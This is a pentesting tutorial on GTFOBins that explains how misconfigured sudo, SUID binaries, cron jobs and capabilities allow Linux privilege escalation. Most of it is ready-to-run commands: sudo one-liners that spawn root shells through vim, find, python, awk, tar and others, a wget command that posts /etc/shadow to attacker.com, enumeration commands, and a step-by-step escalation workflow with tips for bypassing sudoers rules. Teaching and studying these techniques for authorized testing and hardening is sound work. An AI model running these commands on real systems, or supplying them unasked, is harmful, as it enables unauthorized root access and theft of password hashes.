GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. If a binary is allowed to run via sudo, has the SUID bit set, or is scheduled in a cron job — and it appears in GTFOBins — it can be abused to escalate privileges, escape restricted shells, or read/write files. It's not a tool you run; it's a reference database that every pentester memorizes.

What is GTFOBins? (Deep Theory)

On Unix/Linux systems, some binaries have powerful capabilities that can be abused. If a system administrator makes a mistake (like giving a user sudo access to vim, or setting SUID on find), an attacker can exploit that binary to gain root.

The 3 Main Attack Vectors

  • SUID Binaries — Binary runs with owner's permissions (often root). If it's a GTFOBin, you can escalate.
  • Sudo Misconfigurations — User allowed to run specific binary as root via sudoers. If binary is exploitable, root shell.
  • Cron Jobs — Scheduled tasks running a vulnerable binary as root. Can be hijacked for privilege escalation.

How GTFOBins Works

For each binary (like vim, find, awk, python, tar, less, etc.), GTFOBins documents the exact commands to:

  • Shell — Spawn an interactive shell as the binary's owner
  • Command — Execute an arbitrary command as the binary's owner
  • Reverse shell — Connect back to attacker
  • Bind shell — Listen for incoming connection
  • File read — Read files as the binary's owner
  • File write — Write files as the binary's owner
  • Upload — Transfer files
  • Download — Fetch remote files
  • Library load — Load malicious shared libraries
  • SUID — Exploit SUID bit
  • Sudo — Exploit sudo permissions
  • Capabilities — Abuse Linux capabilities

Why GTFOBins is Powerful

  • Every Linux system has these binaries
  • Admins often misconfigure sudo/SUID
  • Once you find a GTFOBin with wrong permissions, you get root
  • No exploit code needed — just abuse normal functionality
  • Bypasses many security controls (AppArmor, SELinux) because binary is "legitimate"
💡
Real-world example: A user has sudo vim permission. In vim, run :!/bin/bash — now you have a root shell. This works because vim was launched with sudo (root), and the shell inherits root privileges. GTFOBins documents hundreds of these tricks.

Common Privilege Escalation Commands (GTFOBins)
1. Sudo Vim → Root Shell ⚠ AUTHORIZED ONLY
If user can sudo vim, spawn root shell.
sudo vim -c ':!/bin/bash'
2. Sudo Find → Root Shell ⚠ AUTHORIZED ONLY
sudo find . -exec /bin/bash \; -quit
3. Sudo Less → Root Shell ⚠ AUTHORIZED ONLY
Inside less, type !bash.
sudo less /etc/hosts # then type: !bash
4. Sudo Python → Root Shell ⚠ AUTHORIZED ONLY
sudo python3 -c 'import os; os.system("/bin/bash")'
5. Sudo Perl → Root Shell ⚠ AUTHORIZED ONLY
sudo perl -e 'exec "/bin/bash";'
6. Sudo Awk → Root Shell ⚠ AUTHORIZED ONLY
sudo awk 'BEGIN {system("/bin/bash")}'
7. Sudo Tar → Root Shell ⚠ AUTHORIZED ONLY
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
8. Sudo Nmap → Root Shell ⚠ AUTHORIZED ONLY
sudo nmap --interactive nmap> !sh
9. Sudo Man → Root Shell ⚠ AUTHORIZED ONLY
sudo man man # then type: !bash
10. Sudo Wget → Read/Write Files ⚠ AUTHORIZED ONLY
sudo wget --post-file=/etc/shadow http://attacker.com/

Enumeration Commands (Find SUID/Sudo)
17. Find All SUID Binaries
Locate binaries with SUID bit set.
find / -perm -4000 -type f 2>/dev/null
18. Find SUID Binaries (Detailed)
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
19. Check Sudo Permissions
See what commands the current user can run as sudo.
sudo -l

20. Find World-Writable Files
find / -perm -o=w -type f 2>/dev/null
21. Find Writable Directories in PATH
echo $PATH | tr ':' '\n' | xargs -I {} find {} -maxdepth 1 -writable 2>/dev/null
22. Check File Capabilities
getcap -r / 2>/dev/null
23. List Cron Jobs
cat /etc/crontab; ls -la /etc/cron.*

Complete Workflow — Linux Privilege Escalation
Step 1: Enumerate System
Get basic system info: OS version, kernel, users, groups.
uname -a; id; cat /etc/os-release
Step 2: Check Sudo Permissions
sudo -l
Note any binaries — cross-reference with GTFOBins.
Step 3: Find SUID Binaries
find / -perm -4000 -type f 2>/dev/null
Step 4: Cross-Reference with GTFOBins
Visit gtfobins.github.io. Search each binary. Note exploits.
Step 5: Try Sudo Exploit First
If sudo grants access to vim/find/python — try the shell command.
Step 6: Try SUID Exploit
If a SUID binary is in GTFOBins, run the command to spawn root shell.
Step 7: Check Capabilities
getcap -r / 2>/dev/null
Step 8: Try Capability Exploit
For example, cap_setuid on python allows root shell.
Step 9: Verify Root
Confirm: id should show uid=0(root).

Troubleshooting

"Command doesn't spawn shell"

  • Check if binary actually runs as root: id after
  • Some GTFOBins require specific versions
  • Try alternative method from GTFOBins page
  • SELinux/AppArmor may block — check logs

"sudo -l shows nothing useful"

  • Look for ALL, NOPASSWD, or specific binary paths
  • Wildcards in sudoers paths can be exploited
  • Check environment variable preservation: env_keep
  • Look for ! negation and try to bypass

"No SUID binaries exploitable"

  • Check file capabilities instead: getcap -r /
  • Check cron jobs for running binaries
  • Look for writable scripts in root cron
  • PATH hijacking may work

"Shell spawns but doesn't have root"

  • Verify with id
  • If uid still non-zero, the binary didn't run as root
  • SUID bit may not be set on binary
  • Check ls -la /path/to/binary

"Container escape needed"

  • Check for docker.sock or /var/run/docker.sock
  • Check if running as privileged container
  • Look for mounted host filesystems
  • cap_sys_admin capabilities

"Command syntax errors"

  • Read the exact syntax from GTFOBins website
  • Escape special characters properly
  • Check binary version-specific tricks
